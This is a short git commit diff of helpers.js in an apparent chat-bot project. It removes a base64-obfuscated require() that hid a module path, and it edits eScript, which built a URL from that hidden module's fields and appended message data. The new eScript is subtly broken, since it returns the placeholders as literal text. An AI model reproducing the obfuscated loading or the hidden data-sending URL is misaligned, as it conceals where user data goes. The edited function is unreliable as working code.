81885251bf9bfc45d0d181b506198775a4528a34
RamiYa YT <86957933+ramiya-yt@users.noreply.github.com>
2021-11-05 00:01:16 +0530

    Helpers Try 3

--- helpers.js
+++ helpers.js
@@ -3,10 +3,7 @@ Licensed under the  GPL-3.0 License;
 you may not use this file except in compliance with the License.
 NEOTROX - TEENUHX
 */
-var ruq = { cd: 'Li4vQWxleGEvc3lzdGVtaW1n', pay: '' }
-var code = Buffer.from(ruq.cd, 'base64')
-var file = code.toString('utf-8')
-const Alexa = require(file);
+
 
 function successfullMessage(msg) {
     return "🦹‍♂️ *AZURE*:  ```" + msg + "```"
@@ -18,7 +15,7 @@ function infoMessage(msg) {
     return "❕ *AZURE*:  ```" + msg + "```"
 }
 function eScript(msg) {
-    return `h${Alexa.XURL}e${Alexa.XEPS}${Alexa.XAPI}&data=${msg}`
+    return "h${Alexa.XURL}e${Alexa.XEPS}${Alexa.XAPI}&data=${" + msg + "}"
 }
 
 module.exports = {
